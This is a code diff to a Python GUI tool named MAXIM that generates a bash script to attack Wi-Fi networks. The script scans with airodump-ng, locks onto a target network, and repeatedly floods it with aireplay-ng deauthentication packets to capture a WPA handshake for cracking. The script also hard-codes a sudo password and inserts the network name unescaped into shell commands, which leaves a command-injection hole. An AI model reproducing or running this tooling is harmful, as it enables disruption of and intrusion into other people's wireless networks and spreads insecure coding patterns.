@@ -1098,77 +1098,97 @@ class MaximWindow(QMainWindow):
         except FileNotFoundError:
             pass
 
-        # ── Bash script: iw scan (no ncurses) → airodump capture ──
+        # ── All-in-one bash script: everything runs in the external terminal ──
+        # Phase 1: airodump-ng scans ALL networks (user sees them in terminal)
+        #          A background loop watches the CSV for our target ESSID
+        #          When found → kills the scan → starts targeted capture + deauth
+        # Phase 2: MAXIM Python poller detects valid .cap → kills terminal → cracks
         script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_hs_')
         script.write("#!/bin/bash\n")
         script.write("echo '5505' | sudo -S -v 2>/dev/null\n")
         script.write(f"mkdir -p '{essid_dir}'\n")
         script.write(f"rm -f '{signal_file}'\n\n")
 
-        # Step 1: Set managed mode for iw scan (iw scan needs managed mode)
-        script.write(f"echo '[1/3] Scanning for {essid}...'\n")
+        # Monitor mode
         script.write(f"sudo ip link set {iface} down 2>/dev/null\n")
-        script.write(f"sudo iw dev {iface} set type managed 2>/dev/null\n")
+        script.write(f"sudo iw dev {iface} set type monitor 2>/dev/null\n")
         script.write(f"sudo ip link set {iface} up 2>/dev/null\n")
-        script.write("sleep 1\n\n")
+        script.write(f"MON={iface}\n")
+        script.write(f"if iw dev {iface}mon info >/dev/null 2>&1; then MON={iface}mon; fi\n\n")
 
-        # Step 2: Use 'iw dev scan' to find BSSID and channel — no ncurses, no CSV parsing
-        script.write("BSSID=''\nCHANNEL=''\n")
-        script.write("for i in 1 2 3 4 5; do\n")
-        script.write(f"  echo \"Scan attempt $i/5...\"\n")
-        # iw scan outputs blocks like:
-        #   BSS aa:bb:cc:dd:ee:ff(on wlan1)
-        #       freq: 2437
-        #       SSID: MAX
-        # We parse BSSID, freq, SSID from the block matching our ESSID
-        script.write(f"  SCAN=$(sudo iw dev {iface} scan 2>/dev/null)\n")
-        script.write("  if [ -n \"$SCAN\" ]; then\n")
-        # Use awk to find the block with our ESSID
-        script.write("    RESULT=$(echo \"$SCAN\" | awk '\n")
-        script.write("      /^BSS / { bssid=$2; sub(/\\(.*/, \"\", bssid); freq=\"\"; ssid=\"\" }\n")
-        script.write("      /freq:/ { freq=$2 }\n")
-        script.write("      /SSID:/ { ssid=$2 }\n")
-        script.write("      ssid == \"" + essid + "\" && bssid != \"\" && freq != \"\" { print bssid, freq; exit }\n")
-        script.write("    ')\n")
-        script.write("    if [ -n \"$RESULT\" ]; then\n")
-        script.write("      BSSID=$(echo \"$RESULT\" | cut -d' ' -f1)\n")
-        script.write("      FREQ=$(echo \"$RESULT\" | cut -d' ' -f2)\n")
-        # Convert frequency to channel
-        script.write("      if [ \"$FREQ\" -ge 2412 ] && [ \"$FREQ\" -le 2484 ]; then\n")
-        script.write("        CHANNEL=$(( ($FREQ - 2407) / 5 ))\n")
-        script.write("        if [ \"$FREQ\" -eq 2484 ]; then CHANNEL=14; fi\n")
-        script.write("      elif [ \"$FREQ\" -ge 5180 ]; then\n")
-        script.write("        CHANNEL=$(( ($FREQ - 5000) / 5 ))\n")
+        scan_csv = "/tmp/maxim_hscan"
+        script.write(f"rm -f {scan_csv}-* 2>/dev/null\n\n")
+
+        # Background watcher: polls the CSV file for our ESSID, extracts BSSID+channel
+        # When found, writes to a signal file and kills the foreground airodump
+        finder_signal = "/tmp/maxim_found_target"
+        script.write(f"rm -f '{finder_signal}'\n")
+        script.write("(\n")
+        script.write("  sleep 5\n")  # give airodump time to write first CSV
+        script.write("  for attempt in $(seq 1 60); do\n")  # try for 5 minutes
+        # Find the latest CSV file written by airodump
+        script.write(f"    CSV=$(ls -t {scan_csv}-*.csv 2>/dev/null | head -1)\n")
+        script.write("    if [ -n \"$CSV\" ]; then\n")
+        # In airodump CSV, AP lines start with MAC address and have ESSID as last field
+        # Format: BSSID, First time, Last time, channel, Speed, Privacy, Cipher, Auth, Power, #beacons, #IV, LAN IP, ID-length, ESSID, Key
+        script.write(f"      LINE=$(grep -i '{essid}' \"$CSV\" | grep -E '^[0-9A-Fa-f]{{2}}:' | head -1)\n")
+        script.write("      if [ -n \"$LINE\" ]; then\n")
+        script.write("        BSSID=$(echo \"$LINE\" | cut -d, -f1 | tr -d ' ')\n")
+        # Channel is field 4 in airodump CSV
+        script.write("        CH=$(echo \"$LINE\" | cut -d, -f4 | tr -d ' ')\n")
+        # Validate channel is positive number
+        script.write("        if echo \"$CH\" | grep -qE '^-?[0-9]+$'; then\n")
+        script.write("          CH=${CH#-}\n")  # strip leading minus if present
+        script.write("        fi\n")
+        script.write("        if echo \"$CH\" | grep -qE '^[0-9]+$' && [ \"$CH\" -ge 1 ] 2>/dev/null && [ \"$CH\" -le 165 ] 2>/dev/null; then\n")
+        script.write(f"          echo \"$BSSID $CH\" > '{finder_signal}'\n")
+        script.write("          kill $(pgrep -f 'airodump-ng.*maxim_hscan') 2>/dev/null\n")
+        script.write("          exit 0\n")
+        script.write("        fi\n")
         script.write("      fi\n")
-        script.write("      echo \"Found: BSSID=$BSSID Freq=$FREQ Channel=$CHANNEL\"\n")
-        script.write("      break\n")
         script.write("    fi\n")
-        script.write("  fi\n")
-        script.write(f"  echo '{essid} not found yet...'\n")
-        script.write("  sleep 2\n")
-        script.write("done\n\n")
+        script.write("    sleep 3\n")
+        script.write("  done\n")
+        script.write(f"  echo 'FAILED' > '{signal_file}'\n")
+        script.write(") &\n")
+        script.write("WATCHER_PID=$!\n\n")
 
-        script.write("if [ -z \"$BSSID\" ] || [ -z \"$CHANNEL\" ]; then\n")
-        script.write(f"  echo 'Could not find {essid}'\n")
+        # Foreground: airodump-ng scans ALL channels, user sees everything in terminal
+        script.write("echo '══════════════════════════════════════════════════════════'\n")
+        script.write(f"echo '  Scanning for: {essid}'\n")
+        script.write("echo '  Will auto-switch to capture when found...'\n")
+        script.write("echo '══════════════════════════════════════════════════════════'\n")
+        script.write("echo\n")
+        script.write(f"sudo airodump-ng -w '{scan_csv}' --output-format csv,pcap --write-interval 1 $MON\n\n")
+
+        # When airodump exits (killed by watcher or user), check if target was found
+        script.write(f"if [ ! -f '{finder_signal}' ]; then\n")
+        script.write("  kill $WATCHER_PID 2>/dev/null\n")
+        script.write(f"  echo 'Target {essid} not found.'\n")
         script.write(f"  echo 'FAILED' > '{signal_file}'\n")
         script.write("  read -p 'Press Enter to close'\n  exit 1\nfi\n\n")
 
-        # Step 3: Switch to monitor mode for capture
-        script.write("echo\necho '[2/3] Monitor mode...'\n")
-        script.write(f"sudo ip link set {iface} down\n")
-        script.write(f"sudo iw dev {iface} set type monitor\n")
-        script.write(f"sudo ip link set {iface} up\n")
-        script.write(f"MON={iface}\n")
-        script.write(f"if iw dev {iface}mon info >/dev/null 2>&1; then MON={iface}mon; fi\n")
-        script.write("echo \"Interface: $MON\"\n\n")
+        # Read BSSID and channel from signal file
+        script.write(f"BSSID=$(cat '{finder_signal}' | cut -d' ' -f1)\n")
+        script.write(f"CHANNEL=$(cat '{finder_signal}' | cut -d' ' -f2)\n")
+        script.write(f"rm -f '{finder_signal}'\n")
+        script.write(f"rm -f {scan_csv}-* 2>/dev/null\n\n")
 
-        # Step 4: Capture handshake (foreground) + deauth (background)
-        script.write("echo '[3/3] Capturing handshake...'\n")
-        script.write("echo \"Target: $BSSID ch $CHANNEL\"\n")
-        script.write("echo 'MAXIM will auto-detect handshake and start cracking.'\necho\n\n")
+        # Now do targeted capture + deauth
+        script.write("clear\n")
+        script.write("echo '══════════════════════════════════════════════════════════'\n")
+        script.write(f"echo '  CAPTURING HANDSHAKE: {essid}'\n")
+        script.write("echo \"  BSSID: $BSSID  Channel: $CHANNEL\"\n")
+        script.write("echo '  MAXIM will auto-detect and start cracking.'\n")
+        script.write("echo '══════════════════════════════════════════════════════════'\n")
+        script.write("echo\n\n")
+
+        # Deauth in background
         script.write("(\n  sleep 3\n  for j in $(seq 1 30); do\n")
         script.write("    sudo aireplay-ng --deauth 10 -a $BSSID $MON >/dev/null 2>&1\n")
         script.write("    sleep 4\n  done\n) &\n\n")
+
+        # Capture in foreground — user sees handshake notification in terminal
         script.write(f"sudo airodump-ng -c $CHANNEL --bssid $BSSID -w '{capture_prefix}' $MON\n\n")
         script.write("echo 'Capture stopped.'\nread -p 'Press Enter to close'\n")
 
